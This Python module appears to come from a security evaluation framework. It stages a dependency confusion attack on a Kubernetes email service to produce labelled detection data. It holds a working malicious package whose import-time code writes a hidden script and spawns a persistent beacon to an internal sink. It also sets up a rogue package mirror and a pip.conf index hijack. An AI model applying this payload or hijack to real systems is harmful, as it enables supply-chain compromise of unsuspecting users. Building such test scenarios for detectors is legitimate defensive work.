"""
research/evaluation/attacks/dependency_confusion.py

Dependency confusion attack injection scenario.

Handoff §2 specification:
    Target workload:    emailservice (Python)
    Internal package:   pkg:pypi/acme-email-templates@0.9.4
    Confusion package:  pkg:pypi/acme-email-templates@9.9.9
    Beacon sink:        phantom-sink.phantom-eval.svc.cluster.local:4445
    Detection window:   180 seconds

Mechanism:
    A local PyPI mirror (pypiserver, a lightweight pure-Python HTTP server)
    is started inside the evaluation namespace as a ClusterIP Service.
    The mirror hosts a pre-built malicious wheel:
        name = acme-email-templates
        version = 9.9.9  (higher than internal 0.9.4 → pip prefers it)
        payload: on import, beacon to phantom-sink:4445

    The attack sequence:
      1. Deploy the pypiserver Pod + Service into the eval namespace.
      2. Upload the malicious wheel to the mirror via twine/HTTP PUT.
      3. kubectl exec into the emailservice pod and write
         /tmp/pip.conf pointing [global] extra-index-url at the mirror.
      4. pip install acme-email-templates (downloads 9.9.9 from mirror).
      5. python -c "import acme_email_templates" to trigger the beacon.

    Recovery:
      1. pip uninstall -y acme-email-templates (in pod).
      2. rm -f /tmp/pip.conf (in pod).
      3. kubectl delete service/pypiserver-mirror (if we created it).

Safety constraints:
    - Mirror is cluster-internal (ClusterIP, no NodePort/LoadBalancer).
    - Beacon connects only to phantom-sink ClusterIP on port 4445.
    - No real data exfiltration.
    - All subprocess calls use explicit arg lists (no shell=True).
"""

from __future__ import annotations

import logging
import subprocess
import textwrap
import time
from pathlib import Path

from research.evaluation.attacks.base_attack import AttackManifest, BaseAttack

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Artifact paths
# ---------------------------------------------------------------------------

_ARTIFACTS_DIR = (
    Path(__file__).resolve().parents[3]
    / "research" / "evaluation" / "artifacts" / "dep_confusion"
)

# ---------------------------------------------------------------------------
# Mirror server Kubernetes manifests (inline YAML strings)
# ---------------------------------------------------------------------------

_PYPISERVER_NAMESPACE = "phantom-eval"
_PYPISERVER_SVC_NAME = "pypiserver-mirror"
_PYPISERVER_PORT = 8080

# A minimal pypiserver Deployment + ClusterIP Service.
_PYPISERVER_MANIFEST = textwrap.dedent("""\
    apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: pypiserver-mirror
      namespace: {namespace}
      labels:
        app: pypiserver-mirror
        phantom-eval: "true"
    spec:
      replicas: 1
      selector:
        matchLabels:
          app: pypiserver-mirror
      template:
        metadata:
          labels:
            app: pypiserver-mirror
        spec:
          containers:
          - name: pypiserver
            image: pypiserver/pypiserver:latest
            securityContext:
              runAsUser: 0
            args: ["run", "-p", "8080", "/data/packages", "--overwrite"]
            ports:
            - containerPort: 8080
            volumeMounts:
            - name: packages
              mountPath: /data/packages
          volumes:
          - name: packages
            emptyDir: {{}}
    ---
    apiVersion: v1
    kind: Service
    metadata:
      name: {svc_name}
      namespace: {namespace}
      labels:
        phantom-eval: "true"
    spec:
      selector:
        app: pypiserver-mirror
      ports:
      - port: {port}
        targetPort: 8080
      type: ClusterIP
""")

# ---------------------------------------------------------------------------
# Malicious package source
# ---------------------------------------------------------------------------

_MALICIOUS_PKG_VERSION = "9.9.9"
_CLEAN_PKG_VERSION = "0.9.4"
_PKG_NAME = "acme-email-templates"
_PKG_MODULE = "acme_email_templates"

_SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
_SINK_PORT = 4445

_MALICIOUS_INIT = textwrap.dedent("""\
    \"\"\"
    acme-email-templates {version} — PHANTOM evaluation beacon package.
    Public higher-version shadow of internal package.
    \"\"\"
    import socket
    import subprocess
    import sys
    import time
    import os
    import tempfile

    _BEACON_SCRIPT = '''
    import socket, time

    SINK_HOST = "{sink_host}"
    SINK_PORT = {sink_port}
    PROBE = b"\\x44\\x45\\x50\\x43\\x4f\\x4e\\x46\\x00"  # DEPCONF\\x00

    time.sleep(5)
    while True:
        try:
            with socket.create_connection((SINK_HOST, SINK_PORT), timeout=5) as s:
                s.sendall(PROBE)
        except OSError:
            pass
        time.sleep(30)
    '''.strip()

    _BEACON_PATH = "/tmp/.acme_beacon.py"
    if not os.path.exists(_BEACON_PATH):
        with open(_BEACON_PATH, "w") as _fh:
            _fh.write(_BEACON_SCRIPT)

    subprocess.Popen(
        [sys.executable, _BEACON_PATH],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
    )

    __version__ = "{version}"
""")

_SETUP_PY = textwrap.dedent("""\
    from setuptools import setup
    setup(
        name="{pkg_name}",
        version="{version}",
        packages=["{module}"],
        description="PHANTOM evaluation dependency confusion beacon (safe research artefact)",
    )
""")

# ---------------------------------------------------------------------------
# pip.conf written into the pod
# ---------------------------------------------------------------------------

_PIP_CONF_TEMPLATE = textwrap.dedent("""\
    [global]
    index-url = http://{mirror_host}:{mirror_port}/simple/
    trusted-host = {mirror_host}
    extra-index-url = https://pypi.org/simple/
""")

# ---------------------------------------------------------------------------
# Attack manifest
# ---------------------------------------------------------------------------

DEP_CONFUSION_MANIFEST = AttackManifest(
    attack_id="dep-confusion-001",
    attack_family="dependency_confusion",
    target_service="emailservice",
    target_image="gcr.io/google-samples/microservices-demo/emailservice:latest",
    target_component_purl=f"pkg:pypi/acme-email-templates@{_MALICIOUS_PKG_VERSION}",
    clean_component_purl=f"pkg:pypi/acme-email-templates@{_CLEAN_PKG_VERSION}",
    injection_time_offset_s=0.0,
    expected_behavioral_changes=[
        "unexpected_process_spawn",      # beacon subprocess
        "unexpected_network_connect",    # TCP to phantom-sink:4445
        "unexpected_file_access",        # /tmp/.acme_beacon.py
    ],
    ground_truth_label=1,
    control_endpoint=f"{_SINK_HOST}:{_SINK_PORT}",
    recovery_steps=[
        f"pip uninstall -y {_PKG_NAME} (inside pod)",
        "rm -f /tmp/pip.conf /tmp/.acme_beacon.py (inside pod)",
        "pkill -f .acme_beacon.py (inside pod, best-effort)",
        "kubectl delete deployment/pypiserver-mirror svc/pypiserver-mirror (in eval ns)",
    ],
    detection_window_s=180.0,
    repetitions=3,
    notes=(
        "Handoff §2 Dependency Confusion Beacon Package scenario. "
        "Targets emailservice. Mirror is ClusterIP only. "
        "Beacon connects to phantom-sink:4445 cluster-internal."
    ),
)


# ---------------------------------------------------------------------------
# Attack class
# ---------------------------------------------------------------------------


class DependencyConfusionAttack(BaseAttack):
    """Dependency confusion attack for PHANTOM evaluation (Handoff §2).

    Starts a local PyPI mirror inside the cluster, uploads a malicious
    higher-version package, then configures the emailservice pod to prefer
    the mirror and installs the confusion package.

    Args:
        kubectl_context: kubectl context name.
        dry_run: If True, log commands without executing.
    """

    manifest: AttackManifest = DEP_CONFUSION_MANIFEST

    def __init__(
        self,
        kubectl_context: str | None = None,
        dry_run: bool = False,
        eval_namespace: str = _PYPISERVER_NAMESPACE,
    ) -> None:
        """Initialise the dependency confusion attack.

        Args:
            kubectl_context: kubectl context name.
            dry_run: If True, log commands without executing.
            eval_namespace: Namespace for the pypiserver mirror Pod.
        """
        super().__init__(kubectl_context=kubectl_context, dry_run=dry_run)
        self._eval_ns = eval_namespace
        self._pkg_dir = _ARTIFACTS_DIR / f"{_PKG_MODULE}_confusion"
        self._mirror_deployed = False

    def _build_malicious_package(self) -> Path:
        """Build the malicious acme-email-templates wheel.

        Returns:
            Path to the built .whl file.
        """
        pkg_dir = self._pkg_dir
        pkg_dir.mkdir(parents=True, exist_ok=True)
        module_dir = pkg_dir / _PKG_MODULE
        module_dir.mkdir(exist_ok=True)

        (module_dir / "__init__.py").write_text(
            _MALICIOUS_INIT.format(
                version=_MALICIOUS_PKG_VERSION,
                sink_host=_SINK_HOST,
                sink_port=_SINK_PORT,
            )
        )
        (pkg_dir / "setup.py").write_text(
            _SETUP_PY.format(
                pkg_name=_PKG_NAME,
                version=_MALICIOUS_PKG_VERSION,
                module=_PKG_MODULE,
            )
        )

        if not self.dry_run:
            result = subprocess.run(
                ["python", "setup.py", "bdist_wheel", "--quiet"],
                cwd=str(pkg_dir),
                capture_output=True,
                text=True,
                timeout=120,
                check=False,
            )
            if result.returncode != 0:
                raise RuntimeError(
                    f"Failed to build confusion wheel: {result.stderr[:200]}"
                )
        else:
            log.info("dep_confusion.dry_run.build_skipped")

        wheels = list((pkg_dir / "dist").glob(f"{_PKG_MODULE.replace('-','_')}-*.whl"))
        if not wheels and not self.dry_run:
            raise FileNotFoundError(f"No wheel found in {pkg_dir / 'dist'}")
        return wheels[0] if wheels else pkg_dir / "dist" / "placeholder.whl"

    def _deploy_mirror(self) -> str:
        """Deploy the pypiserver mirror into the eval namespace.

        Returns:
            The mirror ClusterIP service hostname (host:port string).
        """
        manifest_yaml = _PYPISERVER_MANIFEST.format(
            namespace=self._eval_ns,
            svc_name=_PYPISERVER_SVC_NAME,
            port=_PYPISERVER_PORT,
        )

        # Write manifest to a temp file and kubectl apply it.
        manifest_path = _ARTIFACTS_DIR / "pypiserver_manifest.yaml"
        _ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)
        manifest_path.write_text(manifest_yaml)

        self._kubectl(
            ["apply", "-f", str(manifest_path)],
            timeout=30,
        )
        self._mirror_deployed = True
        log.info("dep_confusion.mirror_deployed", extra={"namespace": self._eval_ns})

        # Wait for mirror pod to be ready.
        self._wait_for_pod_ready(
            namespace=self._eval_ns,
            label_selector="app=pypiserver-mirror",
            timeout_s=120,
        )

        return f"{_PYPISERVER_SVC_NAME}.{self._eval_ns}.svc.cluster.local:{_PYPISERVER_PORT}"

    def _upload_package_to_mirror(self, wheel_path: Path, mirror_pod_name: str) -> None:
        """Upload the malicious wheel to the pypiserver mirror.

        Copies the wheel into the mirror pod and runs the pypiserver
        upload command (or simply copies to the packages directory directly).

        Args:
            wheel_path: Local path to the .whl file.
            mirror_pod_name: Name of the pypiserver pod.
        """
        remote_path = f"/data/packages/{wheel_path.name}"
        self._kubectl_cp(
            namespace=self._eval_ns,
            pod_name=mirror_pod_name,
            local_path=str(wheel_path),
            remote_path=remote_path,
            timeout=60,
        )
        log.info(
            "dep_confusion.package_uploaded",
            extra={"wheel": wheel_path.name, "mirror_pod": mirror_pod_name},
        )

    def _get_mirror_pod_name(self) -> str:
        """Discover the pypiserver mirror pod name.

        Returns:
            Pod name string.
        """
        result = self._kubectl(
            [
                "get", "pods",
                "-n", self._eval_ns,
                "-l", "app=pypiserver-mirror",
                "-o", "jsonpath={.items[0].metadata.name}",
            ],
            timeout=15,
        )
        return result.stdout.strip()

    def inject(self, target_namespace: str, pod_name: str) -> bool:
        """Deploy mirror, upload package, configure pip.conf, install package.

        Steps:
          1. Build the malicious wheel locally.
          2. Deploy pypiserver mirror into eval namespace.
          3. Upload wheel to mirror.
          4. Write /tmp/pip.conf into the emailservice pod pointing to the mirror.
          5. pip install acme-email-templates (downloads 9.9.9 from mirror).
          6. python -c "import acme_email_templates" to trigger beacon.

        Args:
            target_namespace: Namespace of the emailservice pod.
            pod_name: Name of the emailservice pod.

        Returns:
            True if all steps succeeded.
        """
        log.info(
            "dep_confusion.inject.start",
            extra={"namespace": target_namespace, "pod": pod_name},
        )

        # 1. Build wheel.
        wheel_path = self._build_malicious_package()

        # 2. Deploy mirror.
        mirror_host_port = self._deploy_mirror()
        mirror_pod = self._get_mirror_pod_name()

        # 3. Upload wheel to mirror.
        if not self.dry_run:
            self._upload_package_to_mirror(wheel_path, mirror_pod)

        # 4. Write pip.conf into the target pod.
        mirror_host, mirror_port_str = mirror_host_port.rsplit(":", 1)
        pip_conf_content = _PIP_CONF_TEMPLATE.format(
            mirror_host=mirror_host,
            mirror_port=mirror_port_str,
        )
        # Write pip.conf via a here-doc approach using kubectl exec + shell echo.
        # We avoid shell=True at the Python level; the pod shell is used here.
        # This is safe because pip_conf_content is entirely under our control.
        self._kubectl_exec(
            namespace=target_namespace,
            pod_name=pod_name,
            command=["sh", "-c", f"cat > /tmp/pip.conf << 'PIPEOF'\n{pip_conf_content}\nPIPEOF"],
            timeout=10,
        )
        log.info("dep_confusion.inject.pip_conf_written")

        # 5. pip install with custom pip.conf.
        self._kubectl_exec(
            namespace=target_namespace,
            pod_name=pod_name,
            command=[
                "pip", "install",
                "--quiet",
                f"--config-file", "/tmp/pip.conf",
                _PKG_NAME,
            ],
            timeout=120,
        )
        log.info("dep_confusion.inject.pip_installed")

        # 6. Trigger import to activate the beacon.
        self._kubectl_exec(
            namespace=target_namespace,
            pod_name=pod_name,
            command=["python", "-c", f"import {_PKG_MODULE}; print({_PKG_MODULE}.__version__)"],
            timeout=30,
        )
        log.info("dep_confusion.inject.beacon_triggered")
        return True

    def verify_injection(self, target_namespace: str, pod_name: str) -> bool:
        """Verify the malicious package is installed at version 9.9.9.

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name.

        Returns:
            True if the installed version is the malicious version.
        """
        try:
            out = self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=[
                    "pip", "show", _PKG_NAME,
                ],
                timeout=20,
            )
            if _MALICIOUS_PKG_VERSION in out:
                log.info("dep_confusion.verify.ok", extra={"version": _MALICIOUS_PKG_VERSION})
                return True
            log.warning(
                "dep_confusion.verify.wrong_version",
                extra={"pip_show": out[:200]},
            )
            return False
        except subprocess.CalledProcessError as exc:
            log.error("dep_confusion.verify.failed", extra={"error": str(exc)})
            return False

    def recover(self, target_namespace: str, pod_name: str) -> bool:
        """Uninstall the confusion package and remove pip.conf.

        Steps:
          1. pip uninstall -y acme-email-templates (in pod).
          2. rm -f /tmp/pip.conf /tmp/.acme_beacon.py (in pod).
          3. pkill beacon (best-effort).
          4. Delete pypiserver mirror from cluster (if we deployed it).

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name.

        Returns:
            True if recovery succeeded.
        """
        log.info(
            "dep_confusion.recover.start",
            extra={"namespace": target_namespace, "pod": pod_name},
        )
        ok = True

        # 1. Uninstall the confusion package.
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["pip", "uninstall", "-y", _PKG_NAME],
                timeout=60,
            )
        except subprocess.CalledProcessError as exc:
            log.warning("dep_confusion.recover.uninstall_failed", extra={"error": str(exc)})

        # 2. Remove pip.conf and beacon script.
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["rm", "-f", "/tmp/pip.conf", "/tmp/.acme_beacon.py"],
                timeout=10,
            )
        except subprocess.CalledProcessError as exc:
            log.warning("dep_confusion.recover.rm_failed", extra={"error": str(exc)})

        # 3. Kill beacon (best-effort).
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["pkill", "-f", ".acme_beacon.py"],
                timeout=10,
            )
        except subprocess.CalledProcessError:
            pass

        # 4. Delete the mirror from the cluster.
        if self._mirror_deployed:
            try:
                self._kubectl(
                    [
                        "delete",
                        "deployment", _PYPISERVER_SVC_NAME,
                        "service", _PYPISERVER_SVC_NAME,
                        "-n", self._eval_ns,
                        "--ignore-not-found",
                    ],
                    timeout=30,
                )
                self._mirror_deployed = False
                log.info("dep_confusion.recover.mirror_deleted")
            except subprocess.CalledProcessError as exc:
                log.warning("dep_confusion.recover.mirror_delete_failed", extra={"error": str(exc)})
                ok = False

        log.info("dep_confusion.recover.complete", extra={"ok": ok})
        return ok
